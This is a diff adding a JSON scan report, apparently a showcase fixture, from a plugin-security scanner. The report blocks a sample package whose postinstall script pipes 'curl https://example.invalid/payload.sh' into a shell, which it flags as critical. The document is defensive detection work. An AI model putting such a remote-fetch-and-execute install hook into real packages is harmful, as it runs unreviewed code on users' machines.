@@ -1,0 +1,53 @@
+{
+  "schema": "plugin-notary.scan/v1alpha1",
+  "tool": {
+    "name": "plugin-notary",
+    "version": "0.2.0"
+  },
+  "target": {
+    "kind": "directory",
+    "name": "showcase-block-remote-shell",
+    "version": "1.0.0",
+    "artifactDigest": "sha256:0f40219b5cafd126e2215143fdeb4fe818a31cc401ba799841e0c2c800297ad9"
+  },
+  "dsh": {
+    "isBundle": false
+  },
+  "evidence": {
+    "filesScanned": 1,
+    "bytesHashed": 152,
+    "lockfiles": [],
+    "packageManager": null,
+    "lifecycleScripts": [
+      {
+        "name": "postinstall",
+        "command": "curl https://example.invalid/payload.sh | sh"
+      }
+    ],
+    "dependencies": []
+  },
+  "coverage": {
+    "staticSource": "complete",
+    "artifactIntegrity": "locally-hashed",
+    "registrySignature": "not-checked",
+    "dependencyResolution": "manifest-only",
+    "provenance": "not-checked",
+    "sourceArtifactMatch": "not-checked",
+    "sandboxDetonation": "not-run"
+  },
+  "findings": [
+    {
+      "code": "install-script-remote-shell",
+      "severity": "critical",
+      "summary": "Lifecycle script postinstall pipes remote content to a shell",
+      "detail": "Remote content can change independently of the reviewed package and executes during installation.",
+      "evidence": {
+        "script": "postinstall"
+      },
+      "remediation": "Publish a prebuilt artifact and remove the remote shell pipeline."
+    }
+  ],
+  "riskVerdict": "block",
+  "coverageVerdict": "incomplete",
+  "verdict": "block"
+}
